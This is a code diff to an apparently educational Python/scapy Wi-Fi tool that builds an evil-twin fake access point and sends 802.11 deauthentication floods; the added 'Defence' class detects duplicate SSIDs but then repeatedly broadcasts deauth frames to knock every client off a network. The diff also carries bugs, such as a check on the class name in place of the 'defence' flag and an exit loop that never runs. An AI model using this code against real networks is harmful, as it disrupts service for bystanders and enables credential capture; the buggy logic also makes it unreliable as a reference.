@@ -13,8 +13,29 @@ from scapy.all import *
 from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth
 
 ap_list = []
+defence_ap_list = []
 client_list = []
 ap_mac = ''
+
+
+def finding_networks_defence(pkt):
+    """
+    uses for scapy.sniff function.
+    the function check if there is a valid mac address in the pkt
+    using haslayer() and Dot11Beacon.
+    https://stackoverflow.com/questions/42918505/how-to-get-mac-address-of-connected-access-point
+    :param pkt: the packet that is sniffer catch
+    :return: void
+    """
+
+    if pkt.haslayer(Dot11Beacon):  # there is a valid mac address in the pkt.
+        mac_address = pkt[Dot11].addr2
+        ap_name = pkt[Dot11Elt].info.decode()
+        if mac_address not in [x[1] for x in defence_ap_list[0:]]:
+            stats = pkt[Dot11Beacon].network_stats()
+            channel = stats.get("channel")
+            defence_ap_list.append([ap_name, mac_address, channel])
+            print_regular('Found new Access Point : SSID = {} , MAC = {}'.format(ap_name, mac_address))
 
 
 def finding_networks(pkt):
@@ -67,6 +88,27 @@ def deauthentication_attack(client_mac, access_point_mac, interface):
                                                      addr3=client_mac) / Dot11Deauth()
     sendp(client_receive_packet, count=100, iface=interface)
     sendp(access_point_receive_packet, count=100, iface=interface)
+
+def deauthentication_attack_defence(access_point_mac, interface):
+    """
+    Create two packets , one fake packet that will send from the Device to the AP
+    and request to disconnect from the AP, and other packet that will send from the AP to the Device ,
+    each packet is deauthentication packet.
+    :param client_mac represent the client mac address
+    :param access_point_mac represent the access point mac address
+    :param interface represent the interface that sending the packets
+    https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
+    """
+    print_errors('perform deauthentication')
+    client_mac = 'ff:ff:ff:ff:ff:ff'  # to disconnect all the internet devices
+    client_receive_packet = RadioTap() / Dot11(addr1=client_mac, addr2=access_point_mac,
+                                               addr3=access_point_mac) / Dot11Deauth()
+    access_point_receive_packet = RadioTap() / Dot11(addr1=access_point_mac, addr2=client_mac,
+                                                     addr3=client_mac) / Dot11Deauth()
+    sendp(client_receive_packet, count=100, iface=interface)
+    sendp(access_point_receive_packet, count=100, iface=interface)
+    timer_obj = threading.Timer(2.0, deauthentication_attack_defence, [access_point_mac, interface])
+    timer_obj.start()
 
 
 def get_ap(index: int):
@@ -190,12 +232,14 @@ class Attack:
         print_regular('deauthentication attack start , This may take a while , Please wait....')
         deauthentication_attack_thread.join()
 
-    def create_fake_access_point(self, access_point_bssid):
+    def create_fake_access_point(self, access_point_bssid, defence=False):
         self.prepare_fake_access_point(access_point_bssid)
         print_regular('The Fake Access Point is now available using Name : {} '.format(access_point_bssid))
         listen_thread = Thread(target=start_listen, daemon=True)
         listen_thread.start()
         while True:
+            if Defence:
+                break
             user_input = input('{} to turn off the Access Point Please press \"done\"\n'.format(Fore.WHITE))
             if user_input == 'done':
                 exit_and_cleanup(0, 'Done! , thanks for using')
@@ -227,3 +271,63 @@ class Attack:
             f.truncate()
 
         bash('sudo sh build/prepareAP.sh')
+
+    def get_sniffer_interface(self):
+        return self.sniffer
+
+    def get_access_point_interface(self):
+        return self.ap
+
+
+class Defence:
+
+    def __init__(self, ap_index):
+        self.ap_index = ap_index
+
+    def display_problem(self, sniffer_interface, access_point_interface):
+        not_duplicates = []
+        duplicates = []
+
+        channel_thread = Thread(target=channel_changing, args=(sniffer_interface, 15), daemon=True)
+        channel_thread.start()
+        print_regular('Start Scanning networks for finding duplicates, this may take a while...')
+        try:
+            sniff(prn=finding_networks_defence, iface=sniffer_interface, timeout=15)
+        except UnicodeDecodeError as e:
+            print('Exception: in function {}'.format(sniffer_interface), e)
+        channel_thread.join()  # waiting for channel switching to end
+
+        print_header('Networks')
+        if len(defence_ap_list) > 0:
+            for index in range(len(defence_ap_list)):
+                print_regular('[{}] AP Name = {}  MAC Address = {}'.format(index, defence_ap_list[index][0], defence_ap_list[index][1]))
+
+        for network in defence_ap_list:
+            if network[0] in not_duplicates:
+                duplicates.append(network)
+            else:
+                not_duplicates.append(network[0])
+
+        print_header('Duplicates')
+        if len(duplicates) > 0:
+            for index in range(len(duplicates)):
+                print_regular(
+                    '{} BSSID = {} , MAC_ADDRESS = {}\n'.format(index, duplicates[index][0], duplicates[0][1]))
+            print_header('Preventing attack')
+            timer_obj = threading.Timer(2.0, deauthentication_attack_defence,
+                                        [ap_list[int(self.ap_index)][1], sniffer_interface])
+            timer_obj.start()
+            user_input = input('to end the program please type \"Done\"')
+            while user_input == 'invalid':
+                user_input = input('to end the program please type \"Done\"')
+                user_input = user_input if user_input == 'Done' else 'invalid'
+                print_regular('Great Perform clean and exit , thanks') if user_input == 'Done' else print_errors(
+                    'the input is {}  that is not \"Done\"  word please try again {}\n'.format(
+                        user_input, Fore.WHITE))
+            print_regular('im out')
+
+            exit_and_cleanup(0, 'Done')
+
+        else:
+            print_errors('The Access Point have failed to upload please...')
+            exit_and_cleanup(-1, 'Demonstration has failed , some thing wrong with AP')
